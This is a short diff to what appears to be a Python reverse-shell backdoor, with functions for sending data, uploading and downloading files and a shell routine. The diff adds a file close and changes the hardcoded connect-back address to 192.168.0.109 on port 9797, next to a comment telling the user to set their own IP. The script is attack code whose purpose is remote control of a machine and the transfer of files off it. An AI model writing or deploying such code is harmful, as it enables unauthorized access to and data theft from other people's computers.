@@ -23,6 +23,7 @@ def reliable_send(data):
 def upload_file(file_name):
     f = open(file_name, 'rb')
     s.send(f.read())
+    f.close()
 
 def download_file(file_name):
     f = open(file_name, 'wb')
@@ -96,5 +97,5 @@ def shell():
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 msg = "Hello!!"
 IP_ADDRESS = '' #Change your IP ADDRESS here
-s.connect(('192.168.56.1', 9797)) 
+s.connect(('192.168.0.109', 9797)) 
 shell()
